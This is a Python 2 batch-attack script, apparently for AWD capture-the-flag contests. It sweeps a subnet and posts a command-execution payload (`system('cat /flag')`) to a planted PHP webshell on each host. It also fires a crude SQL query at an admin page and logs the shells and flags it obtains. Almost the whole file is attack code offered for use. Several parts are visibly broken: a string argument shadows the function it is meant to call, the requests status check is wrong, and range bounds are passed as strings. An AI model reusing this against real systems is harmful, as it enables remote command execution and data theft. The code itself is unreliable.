# -*- coding: UTF-8 -*
#//========================================================================================
#//                                                                                        
#//  ##      ##  ######  ##   ##  ##  ##   ##  ###    ###                                
#//  ##      ##    ##    ##   ##  ##  ##   ##  ## #  # ##                                
#//  ##      ##    ##    #######  ##  ##   ##  ##  ##  ##                                
#//  ##      ##    ##    ##   ##  ##  ##   ##  ##      ##                                
#//  ######  ##    ##    ##   ##  ##   #####   ##      ##                                
#//                                                                                        
#//========================================================================================

import requests
import sys
import getopt


# ---------------------------------------------------------------------------- #
#                                自定义payload函数                              #
# ---------------------------------------------------------------------------- #

def oneword(url):
	#根据实际情况调整
	passwd="g"
	payload =  {passwd: 'system(\'cat /flag\');'} 
	path = "/Upload/xiaoma.php"
	url = url+path
	webshelllist = open("webshelllist.txt","a")
	try:
		res = requests.post(url, payload, timeout=1)
		if res.status_code == res.codes.ok:
			result = url+" connect shell sucess,flag is "+res.text
			print result
			print >>flag,result
			print >>webshelllist,url+","+passwd
		else:	
			print "shell 404"
	except:
		print url+" connect shell fail"


def sql_inject(url):
	#自定义payload
	payload = "select username,passwd from USER"
	#sql注入路径
	path = "/admin.php?submit="
	url = url+path

	try:
		res = requests.get(url,payload,timeout=1)
		if res.status_code == res.codes.ok:
			result = url+" sql inject sucess, flag is "+res.text
			print result
			print >>flag,result
		else:
			print " sql error"
	except:
		print url+" sql inject fail"

	



# ---------------------------------------------------------------------------- #
#              定义参数方法 ，根据自己定义的payload函数修改条件                    #
# ---------------------------------------------------------------------------- #
def method(url, method):
	method = sys.argv[2]

	if method == "oneword":
		oneword(url)
	elif method == "sqli":
		sql_inject(url)

	
# ---------------------------------------------------------------------------- #
#                                     执行攻击                                  #
# ---------------------------------------------------------------------------- #

# host="http://192.168.1"+segment="1 to 255"	#主机域名+网段
def exploit(host, seg_start, seg_stop, port, method):
	global flag

	for i in range(seg_start, seg_stop):

		url = host+"."+str(i)+":"+port
		flag = open("flag.txt","a")
		
		try:
			method(url, method)
		except:
			print url+"expolit fail"
			continue
		
	flag.close()


def usage():
    print "AWD批量攻击脚本 by Lithium"
    print
    print "Usage: exploit.py -h [host] -a [seg_start] -b [seg_stop] - p [port] -m [method]"
    print
    print "Examples:"
    print "exploit.py -h 192.168.0 -a 30 -b 51 -p 80 -m oneword"
    print "exploit.py -h 192.168.0 -a 30 -b 51 -p 80 -m sqli"
    sys.exit(0)

if __name__ == '__main__':

	print "//========================================================//"
	print "//                                                 		 //"                                   
	print "//  ##      ##  ######  ##   ##  ##  ##   ##  ###    ###  //"                             
	print "//  ##      ##    ##    ##   ##  ##  ##   ##  ## #  # ##  //"                              
	print "//  ##      ##    ##    #######  ##  ##   ##  ##  ##  ##  //"                              
	print "//  ##      ##    ##    ##   ##  ##  ##   ##  ##      ##  //"                              
	print "//  ######  ##    ##    ##   ##  ##   #####   ##      ##  //"                              
	print "//                                                        //"                                
	print "//========================================================//"


	if not len(sys.argv[1:]):
		usage()
	try:
		opts, args = getopt.getopt(sys.argv[1:], "Hh:a:b:p:m:", ["help","host", "seg_start", "seg_stop", "port", "method"])
	except getopt.GetoptError as err:
		print str(err)
		usage()

	for o,a in opts:
		if o in ("-H","--help"):
			usage()
		elif o in ("-h", "--host"):
			host = a
		elif o in ("-a", "--seg_start"):
			seg_start = a
		elif o in ("-b", "--seg_stop"):
			seg_stop = a
		elif o in ("-p", "--port"):
			port = a
		elif o in ("-m", "--method"):
			method = a
		else:
			assert False,"Unhandled Option"
		
	exploit(host, seg_start, seg_stop, port, method)